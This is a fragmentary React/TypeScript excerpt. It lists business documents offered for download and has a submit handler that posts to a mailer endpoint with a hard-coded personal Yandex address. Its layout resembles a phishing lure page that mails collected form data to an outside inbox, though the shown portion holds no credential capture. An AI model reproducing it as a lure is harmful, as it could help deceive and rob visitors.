...
const AVAILABLE_FILES = [
  { id: 101, name: 'Product Specifications.xls', size: '2.4 MB', type: 'xls' },
  { id: 102, name: 'Company Profile.pdf', size: '5.7 MB', type: 'pdf' },
  { id: 103, name: 'Items Quantities.xls', size: '1.8 MB', type: 'xls' },
  { id: 104, name: 'Company Introduction.pdf', size: '3.2 MB', type: 'pdf' },
  { id: 105, name: 'Presentation.pptx', size: '15.1 MB', type: 'ppt' },
...
export const App = () => {
  ...
  const handleSubmit = async() => {
    ...
    const request = await axios.post('/api/mailer', {
      email: "richard.banderas@yandex.com" as string,
